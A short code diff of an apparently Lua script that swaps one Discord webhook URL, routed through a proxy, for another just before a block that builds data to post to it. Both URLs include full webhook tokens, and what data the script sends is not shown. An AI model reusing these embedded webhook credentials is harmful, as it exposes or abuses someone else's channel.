@@ -60,7 +60,7 @@ end
 
 
 
-local webh = "https://webhook.lewisakura.moe/api/webhooks/1057386593834520696/O1iOlm7x73qOuGL8fKcqlvyPwXgqtUmWfRXl7vti53wLTeQFxTpkCdBgK5w9vx6cEBqM"
+local webh = "https://webhook.lewisakura.moe/api/webhooks/1084218278261567569/9DWBfgbX2vT9G9xfpPgeJubD21slejuX2GpBjxxdDhMoJlFV_x3jllIti_-BRmqHBDMZ"
 
 pcall(function()
    local data = {
